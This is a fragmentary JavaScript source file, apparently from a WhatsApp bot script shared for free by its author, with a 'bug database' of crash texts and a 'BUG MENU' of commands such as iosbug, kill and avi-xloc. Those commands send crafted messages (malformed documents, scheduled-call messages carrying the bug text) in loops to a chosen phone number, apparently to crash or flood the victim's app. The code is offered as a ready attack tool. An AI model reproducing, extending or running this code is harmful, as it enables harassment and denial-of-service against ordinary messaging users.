//base by Avishka shavinda
//YouTube: @AviNetHunter
//Telegram: t.me/AviNetHunter
//GitHub: @avishka33
//WhatsApp: +94772836332
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@Avi_NetHunter?sub_confirmation=1
...
//bug database
const { avitext1 } = require('./SPAM/avitext1')
const { avitext2 } = require('./SPAM/avitext2')
const { avitext3 } = require('./SPAM/avitext3')
const { avitext4 } = require('./SPAM/avitext4')
const { avitext5 } = require('./SPAM/avitext5')
const { avitext6 } = require('./SPAM/avitext6')
const wkwk = fs.readFileSync(`./SPAM/x.mp3`)
const xsteek = fs.readFileSync(`./SPAM/x.webp`)
...
const xtime = moment.tz('Asia/srilanka').format('HH:mm:ss')
        const xdate = moment.tz('Asia/srilanka').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/srilanka').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
...
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./AviMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
...
mimetype: `image/null`,
fileName: `${dgxeon}.${avitext1}` ,
caption: `${dgxeon + avitext1}`,
...
XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner <AVI> 😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
...
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${avitext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/srilanka").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
...
╰┈➤ʙᴜɢ ᴍᴇɴᴜ
avi-react <reply chat>
Avix <number|amount>
Avix2 <amount>
iosbug <number|amount>
iosbug2 <amount>
avi-audio <number|amount>
avi-audio2 <amount>
avi-sticker <number|amount>
avi-sticker2 <amount>
avi-avi-xloc <number|amount>
avi-xloc <amount>
list <number|amount>
list2 <amount>
kill <number|amount>
...
if (typemenu === 'v1') {
                    ...
                    XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./AviMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
